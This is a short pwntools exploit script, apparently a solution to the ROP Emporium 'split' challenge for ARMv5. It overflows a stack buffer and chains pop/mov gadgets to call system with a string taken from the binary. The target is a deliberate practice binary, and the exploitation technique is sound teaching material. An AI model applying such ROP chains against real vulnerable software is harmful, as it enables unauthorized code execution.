#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('split_armv5')
context(terminal=['tmux', 'split-window', '-h'])

gs='''
b *pwnme+64
c
'''

# 0x000103a4 : pop {r3, pc}
g_popr3 = 0x000103a4
# 0x00010558 : mov r0, r3 ; pop {fp, pc}
g_movr0r3 = 0x00010558


if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)

io.recvuntil(b"> ")

usefulString = elf.symbols["usefulString"]
usefulFunction = elf.symbols["usefulFunction"]
system = usefulFunction+12

log.info(f"{usefulString=:x}")
log.info(f"{system=:x}")
log.info(f"{g_popr3=:x}")

PL=0x20*b"A"
PL+=p32(0)              # for pop fp
PL+=p32(g_popr3 )       # pop {r3,pc}; pop {fp, pc}
PL+=p32(usefulString)   #   => r3 
PL+=p32(g_movr0r3 )     #   => pc 
PL+=p32(0)              #        => fp
PL+=p32(system)         #        => pc
io.sendline(PL)
io.interactive()

